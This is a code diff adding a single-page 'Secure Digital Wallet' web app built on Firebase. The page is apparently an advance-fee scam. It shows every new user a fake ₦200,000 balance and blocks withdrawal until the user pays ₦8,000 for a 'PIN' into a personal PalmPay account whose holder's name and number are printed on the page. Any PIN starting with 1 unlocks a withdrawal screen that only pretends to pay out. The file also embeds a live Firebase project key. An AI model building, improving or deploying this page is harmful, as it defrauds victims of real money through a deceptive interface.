@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Digital Wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            border-color: #1a2a6c;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 42, 108, 0.2);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .balance-container {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .balance-label {
+            font-size: 18px;
+            margin-bottom: 10px;
+            opacity: 0.9;
+        }
+        
+        .balance-amount {
+            font-size: 40px;
+            font-weight: 700;
+        }
+        
+        .menu {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .menu-item {
+            background-color: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+        
+        .menu-item:hover {
+            transform: translateY(-5px);
+            border-color: #1a2a6c;
+            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .menu-icon {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #1a2a6c;
+        }
+        
+        .menu-text {
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .withdraw-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .withdraw-option {
+            background-color: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+        
+        .withdraw-option:hover {
+            transform: translateY(-5px);
+            border-color: #1a2a6c;
+        }
+        
+        .withdraw-icon {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #1a2a6c;
+        }
+        
+        .withdraw-text {
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .pin-instructions {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #856404;
+            font-weight: 600;
+            text-align: center;
+        }
+        
+        .account-details {
+            background-color: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .account-name {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #1a2a6c;
+        }
+        
+        .account-number {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #b21f1f;
+        }
+        
+        .account-type {
+            font-size: 16px;
+            color: #6c757d;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .form-toggle {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .form-toggle a {
+            color: #1a2a6c;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .form-toggle a:hover {
+            text-decoration: underline;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: #4caf50;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            display: none;
+        }
+        
+        .notification.error {
+            background-color: #f44336;
+        }
+        
+        .back-btn {
+            background: none;
+            border: none;
+            color: #1a2a6c;
+            font-size: 18px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .error-message {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .payment-amount {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .payment-label {
+            font-size: 18px;
+            margin-bottom: 10px;
+            opacity: 0.9;
+        }
+        
+        .payment-value {
+            font-size: 36px;
+            font-weight: 700;
+        }
+        
+        .copy-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #218838;
+            transform: translateY(-2px);
+        }
+        
+        .pin-input-single {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            letter-spacing: 3px;
+        }
+        
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a2a6c;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Login Form -->
+        <div id="login-form" class="content">
+            <div class="header">
+                <h1>Secure Digital Wallet</h1>
+                <p>Access your account securely</p>
+            </div>
+            
+            <div class="form-group">
+                <label for="login-email">Email</label>
+                <input type="email" id="login-email" placeholder="Enter your email">
+            </div>
+            
+            <div class="form-group">
+                <label for="login-password">Password</label>
+                <input type="password" id="login-password" placeholder="Enter your password">
+            </div>
+            
+            <button class="btn" id="login-btn">Login</button>
+            <div class="loader" id="login-loader"></div>
+            
+            <div class="form-toggle">
+                <p>Don't have an account? <a id="show-register">Register</a></p>
+            </div>
+        </div>
+        
+        <!-- Register Form -->
+        <div id="register-form" class="content hidden">
+            <div class="header">
+                <h1>Create Account</h1>
+                <p>Join our secure digital wallet</p>
+            </div>
+            
+            <div class="form-group">
+                <label for="register-username">Username</label>
+                <input type="text" id="register-username" placeholder="Choose a username">
+            </div>
+            
+            <div class="form-group">
+                <label for="register-email">Email</label>
+                <input type="email" id="register-email" placeholder="Enter your email">
+            </div>
+            
+            <div class="form-group">
+                <label for="register-password">Password</label>
+                <input type="password" id="register-password" placeholder="Create a password">
+            </div>
+            
+            <div class="form-group">
+                <label for="register-confirm-password">Confirm Password</label>
+                <input type="password" id="register-confirm-password" placeholder="Confirm your password">
+            </div>
+            
+            <button class="btn" id="register-btn">Register</button>
+            <div class="loader" id="register-loader"></div>
+            
+            <div class="form-toggle">
+                <p>Already have an account? <a id="show-login">Login</a></p>
+            </div>
+        </div>
+        
+        <!-- Dashboard -->
+        <div id="dashboard" class="content hidden">
+            <div class="header">
+                <h1>My Wallet</h1>
+                <p id="welcome-user">Welcome, User!</p>
+            </div>
+            
+            <div class="balance-container">
+                <div class="balance-label">Available Balance</div>
+                <div class="balance-amount">₦200,000.000</div>
+            </div>
+            
+            <div class="menu">
+                <div class="menu-item" id="withdraw-btn">
+                    <div class="menu-icon">💸</div>
+                    <div class="menu-text">Withdraw</div>
+                </div>
+                <div class="menu-item" id="pin-buy-btn">
+                    <div class="menu-icon">🔑</div>
+                    <div class="menu-text">Buy PIN</div>
+                </div>
+                <div class="menu-item">
+                    <div class="menu-icon">📊</div>
+                    <div class="menu-text">Transactions</div>
+                </div>
+                <div class="menu-item" id="logout-btn">
+                    <div class="menu-icon">🚪</div>
+                    <div class="menu-text">Logout</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Withdraw Page -->
+        <div id="withdraw-page" class="content hidden">
+            <button class="back-btn" id="back-from-withdraw">← Back</button>
+            
+            <div class="header">
+                <h1>Withdraw Funds</h1>
+                <p>Choose your withdrawal method</p>
+            </div>
+            
+            <div id="withdraw-error" class="error-message">
+                Please go and buy PIN before you withdraw your amount
+            </div>
+            
+            <div class="withdraw-options">
+                <div class="withdraw-option" id="opay-withdraw">
+                    <div class="withdraw-icon">💳</div>
+                    <div class="withdraw-text">Opay</div>
+                </div>
+                <div class="withdraw-option" id="palmpay-withdraw">
+                    <div class="withdraw-icon">📱</div>
+                    <div class="withdraw-text">PalmPay</div>
+                </div>
+                <div class="withdraw-option" id="moniepoint-withdraw">
+                    <div class="withdraw-icon">🏦</div>
+                    <div class="withdraw-text">Moniepoint</div>
+                </div>
+                <div class="withdraw-option">
+                    <div class="withdraw-icon">🏧</div>
+                    <div class="withdraw-text">Bank Transfer</div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="withdraw-amount">Amount (₦)</label>
+                <input type="number" id="withdraw-amount" placeholder="Enter amount to withdraw">
+            </div>
+            
+            <div class="form-group">
+                <label for="withdraw-account">Account Number</label>
+                <input type="text" id="withdraw-account" placeholder="Enter account number">
+            </div>
+            
+            <button class="btn" id="confirm-withdraw">Withdraw</button>
+        </div>
+        
+        <!-- PIN Buy Page -->
+        <div id="pin-buy-page" class="content hidden">
+            <button class="back-btn" id="back-from-pin">← Back</button>
+            
+            <div class="header">
+                <h1>Buy PIN</h1>
+                <p>Purchase PIN codes securely</p>
+            </div>
+            
+            <div id="pin-error" class="error-message">
+                Incorrect PIN
+            </div>
+            
+            <div class="pin-instructions">
+                <strong>BE CAREFUL! Look again! Copy the account number on your screen. Send payment to get PIN code.</strong>
+            </div>
+            
+            <!-- Payment Amount Display -->
+            <div class="payment-amount">
+                <div class="payment-label">Payment Amount</div>
+                <div class="payment-value">₦8,000</div>
+                <small>Send exactly this amount to the account below</small>
+            </div>
+            
+            <div class="account-details">
+                <div class="account-name">Account name: Abbas Muhammad yakubu</div>
+                <div class="account-number">Account no: 8902144010</div>
+                <div class="account-type">Account type: palm pay</div>
+                <button class="copy-btn" id="copy-account">Copy Account Number</button>
+            </div>
+            
+            <div class="form-group">
+                <label for="pin-code">Enter PIN Code</label>
+                <input type="text" id="pin-code" class="pin-input-single" placeholder="Enter your 4-digit PIN" maxlength="4">
+            </div>
+            
+            <button class="btn" id="confirm-pin-purchase">Purchase PIN</button>
+        </div>
+    </div>
+    
+    <div class="notification" id="notification">Operation completed successfully!</div>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+  apiKey: "AIzaSyBgRqFzjIXdntHJS8zaSpEXrmYRXg2h8OE",
+  authDomain: "telegramapp-ee762.firebaseapp.com",
+  databaseURL: "https://telegramapp-ee762-default-rtdb.firebaseio.com",
+  projectId: "telegramapp-ee762",
+  storageBucket: "telegramapp-ee762.firebasestorage.app",
+  messagingSenderId: "750866485805",
+  appId: "1:750866485805:web:e09d923511f8babcee5ea4"
+};
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        // DOM Elements
+        const loginForm = document.getElementById('login-form');
+        const registerForm = document.getElementById('register-form');
+        const dashboard = document.getElementById('dashboard');
+        const withdrawPage = document.getElementById('withdraw-page');
+        const pinBuyPage = document.getElementById('pin-buy-page');
+        const notification = document.getElementById('notification');
+        
+        // Loaders
+        const loginLoader = document.getElementById('login-loader');
+        const registerLoader = document.getElementById('register-loader');
+        
+        // Buttons
+        const showRegisterBtn = document.getElementById('show-register');
+        const showLoginBtn = document.getElementById('show-login');
+        const loginBtn = document.getElementById('login-btn');
+        const registerBtn = document.getElementById('register-btn');
+        const logoutBtn = document.getElementById('logout-btn');
+        const withdrawBtn = document.getElementById('withdraw-btn');
+        const pinBuyBtn = document.getElementById('pin-buy-btn');
+        const backFromWithdrawBtn = document.getElementById('back-from-withdraw');
+        const backFromPinBtn = document.getElementById('back-from-pin');
+        const confirmWithdrawBtn = document.getElementById('confirm-withdraw');
+        const confirmPinPurchaseBtn = document.getElementById('confirm-pin-purchase');
+        const copyAccountBtn = document.getElementById('copy-account');
+        
+        // Withdrawal options
+        const opayWithdraw = document.getElementById('opay-withdraw');
+        const palmpayWithdraw = document.getElementById('palmpay-withdraw');
+        const moniepointWithdraw = document.getElementById('moniepoint-withdraw');
+        
+        // PIN input
+        const pinCodeInput = document.getElementById('pin-code');
+
+        // Event Listeners
+        showRegisterBtn.addEventListener('click', () => {
+            loginForm.classList.add('hidden');
+            registerForm.classList.remove('hidden');
+        });
+        
+        showLoginBtn.addEventListener('click', () => {
+            registerForm.classList.add('hidden');
+            loginForm.classList.remove('hidden');
+        });
+        
+        loginBtn.addEventListener('click', handleLogin);
+        registerBtn.addEventListener('click', handleRegister);
+        logoutBtn.addEventListener('click', handleLogout);
+        withdrawBtn.addEventListener('click', () => {
+            dashboard.classList.add('hidden');
+            withdrawPage.classList.remove('hidden');
+        });
+        
+        pinBuyBtn.addEventListener('click', () => {
+            dashboard.classList.add('hidden');
+            pinBuyPage.classList.remove('hidden');
+        });
+        
+        backFromWithdrawBtn.addEventListener('click', () => {
+            withdrawPage.classList.add('hidden');
+            dashboard.classList.remove('hidden');
+        });
+        
+        backFromPinBtn.addEventListener('click', () => {
+            pinBuyPage.classList.add('hidden');
+            dashboard.classList.remove('hidden');
+        });
+        
+        confirmWithdrawBtn.addEventListener('click', handleWithdraw);
+        confirmPinPurchaseBtn.addEventListener('click', handlePinPurchase);
+        copyAccountBtn.addEventListener('click', copyAccountNumber);
+        
+        // Withdrawal method selection
+        opayWithdraw.addEventListener('click', () => selectWithdrawalMethod('Opay'));
+        palmpayWithdraw.addEventListener('click', () => selectWithdrawalMethod('PalmPay'));
+        moniepointWithdraw.addEventListener('click', () => selectWithdrawalMethod('Moniepoint'));
+
+        // Functions
+        function handleLogin() {
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            
+            if (!email || !password) {
+                showNotification('Please enter both email and password', true);
+                return;
+            }
+            
+            // Show loader
+            loginLoader.style.display = 'block';
+            loginBtn.disabled = true;
+            
+            // Firebase authentication
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    const user = userCredential.user;
+                    
+                    // Get user data from Firestore
+                    return db.collection('users').doc(user.uid).get();
+                })
+                .then((doc) => {
+                    if (doc.exists) {
+                        const userData = doc.data();
+                        document.getElementById('welcome-user').textContent = `Welcome, ${userData.username || userData.email}!`;
+                    } else {
+                        document.getElementById('welcome-user').textContent = `Welcome, ${email}!`;
+                    }
+                    
+                    loginForm.classList.add('hidden');
+                    dashboard.classList.remove('hidden');
+                    showNotification('Login successful!');
+                })
+                .catch((error) => {
+                    showNotification('Invalid email or password', true);
+                })
+                .finally(() => {
+                    // Hide loader
+                    loginLoader.style.display = 'none';
+                    loginBtn.disabled = false;
+                });
+        }
+        
+        function handleRegister() {
+            const username = document.getElementById('register-username').value;
+            const email = document.getElementById('register-email').value;
+            const password = document.getElementById('register-password').value;
+            const confirmPassword = document.getElementById('register-confirm-password').value;
+            
+            if (!username || !email || !password || !confirmPassword) {
+                showNotification('Please fill all fields', true);
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                showNotification('Passwords do not match', true);
+                return;
+            }
+            
+            if (password.length < 6) {
+                showNotification('Password should be at least 6 characters', true);
+                return;
+            }
+            
+            // Show loader
+            registerLoader.style.display = 'block';
+            registerBtn.disabled = true;
+            
+            // Firebase registration
+            auth.createUserWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    const user = userCredential.user;
+                    
+                    // Save user data to Firestore
+                    return db.collection('users').doc(user.uid).set({
+                        username: username,
+                        email: email,
+                        balance: 200000.00,
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+                        hasPurchasedPIN: false
+                    });
+                })
+                .then(() => {
+                    showNotification('Registration successful! Please login.');
+                    registerForm.classList.add('hidden');
+                    loginForm.classList.remove('hidden');
+                })
+                .catch((error) => {
+                    let errorMessage = 'Registration failed';
+                    if (error.code === 'auth/email-already-in-use') {
+                        errorMessage = 'Email already in use';
+                    } else if (error.code === 'auth/weak-password') {
+                        errorMessage = 'Password is too weak';
+                    } else if (error.code === 'auth/invalid-email') {
+                        errorMessage = 'Invalid email address';
+                    }
+                    showNotification(errorMessage, true);
+                })
+                .finally(() => {
+                    // Hide loader
+                    registerLoader.style.display = 'none';
+                    registerBtn.disabled = false;
+                });
+        }
+        
+        function handleLogout() {
+            auth.signOut().then(() => {
+                dashboard.classList.add('hidden');
+                loginForm.classList.remove('hidden');
+                showNotification('Logged out successfully');
+            });
+        }
+        
+        function handleWithdraw() {
+            const amount = document.getElementById('withdraw-amount').value;
+            const account = document.getElementById('withdraw-account').value;
+            
+            if (!amount || !account) {
+                showNotification('Please fill all fields', true);
+                return;
+            }
+            
+            if (amount > 200000) {
+                showNotification('Insufficient balance', true);
+                return;
+            }
+            
+            // Check if user has purchased PIN
+            const user = auth.currentUser;
+            if (user) {
+                db.collection('users').doc(user.uid).get()
+                    .then((doc) => {
+                        if (doc.exists && doc.data().hasPurchasedPIN) {
+                            showNotification(`Withdrawal of ₦${amount} initiated successfully!`);
+                            // Reset form
+                            document.getElementById('withdraw-amount').value = '';
+                            document.getElementById('withdraw-account').value = '';
+                        } else {
+                            showNotification('Please buy PIN before withdrawing', true);
+                        }
+                    });
+            } else {
+                showNotification('Please buy PIN before withdrawing', true);
+            }
+        }
+        
+        function handlePinPurchase() {
+            const pinCode = pinCodeInput.value;
+            
+            if (!pinCode) {
+                showNotification('Please enter PIN code', true);
+                return;
+            }
+            
+            if (pinCode.length !== 4) {
+                showNotification('PIN must be 4 digits', true);
+                return;
+            }
+            
+            // Check if PIN is correct (for demo, any 4-digit PIN starting with 1 is valid)
+            if (pinCode.startsWith('1')) {
+                // Update user's PIN purchase status in Firestore
+                const user = auth.currentUser;
+                if (user) {
+                    db.collection('users').doc(user.uid).update({
+                        hasPurchasedPIN: true,
+                        pinPurchasedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    })
+                    .then(() => {
+                        showNotification('PIN purchased successfully! You can now withdraw funds.');
+                        pinBuyPage.classList.add('hidden');
+                        dashboard.classList.remove('hidden');
+                        pinCodeInput.value = '';
+                    })
+                    .catch((error) => {
+                        showNotification('Error updating account', true);
+                    });
+                }
+            } else {
+                showNotification('Incorrect PIN', true);
+            }
+        }
+        
+        function copyAccountNumber() {
+            const accountNumber = "8902144010";
+            navigator.clipboard.writeText(accountNumber).then(() => {
+                showNotification('Account number copied to clipboard!');
+            }).catch(err => {
+                showNotification('Failed to copy account number', true);
+            });
+        }
+        
+        function selectWithdrawalMethod(method) {
+            // Reset all withdrawal options
+            document.querySelectorAll('.withdraw-option').forEach(option => {
+                option.style.borderColor = 'transparent';
+                option.style.backgroundColor = '#f8f9fa';
+            });
+            
+            // Highlight selected method
+            let selectedElement;
+            if (method === 'Opay') selectedElement = opayWithdraw;
+            else if (method === 'PalmPay') selectedElement = palmpayWithdraw;
+            else if (method === 'Moniepoint') selectedElement = moniepointWithdraw;
+            
+            selectedElement.style.borderColor = '#1a2a6c';
+            selectedElement.style.backgroundColor = '#e9ecef';
+            
+            showNotification(`${method} selected for withdrawal`);
+        }
+        
+        function showNotification(message, isError = false) {
+            notification.textContent = message;
+            notification.classList.toggle('error', isError);
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Check if user is already logged in
+        auth.onAuthStateChanged((user) => {
+            if (user) {
+                // Get user data from Firestore
+                db.collection('users').doc(user.uid).get()
+                    .then((doc) => {
+                        if (doc.exists) {
+                            const userData = doc.data();
+                            document.getElementById('welcome-user').textContent = `Welcome, ${userData.username || user.email}!`;
+                        } else {
+                            document.getElementById('welcome-user').textContent = `Welcome, ${user.email}!`;
+                        }
+                        
+                        loginForm.classList.add('hidden');
+                        dashboard.classList.remove('hidden');
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
